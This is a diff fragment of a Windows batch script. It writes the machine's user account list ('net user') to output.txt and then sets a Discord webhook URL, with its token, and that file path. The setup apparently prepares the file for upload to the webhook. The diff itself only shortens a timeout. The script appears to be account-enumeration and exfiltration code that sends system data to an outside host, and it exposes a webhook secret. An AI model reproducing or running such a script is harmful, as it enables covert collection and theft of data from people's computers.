@@ -76,7 +76,7 @@ set "Users_file=output.txt"
 net user >> "%Users_file%"
 
 
-timeout /t 2 >nul
+timeout /t 1 >nul
 
 set WEBHOOK_URL=https://discord.com/api/webhooks/1115008667113238548/3tOV92OktoESH6tCiY0OnPFjlk6ZRdjLxVpf3gbzkyZw4GfeISM0sx6w2x2yfGwPpeqw
 set FILE_PATH=output.txt
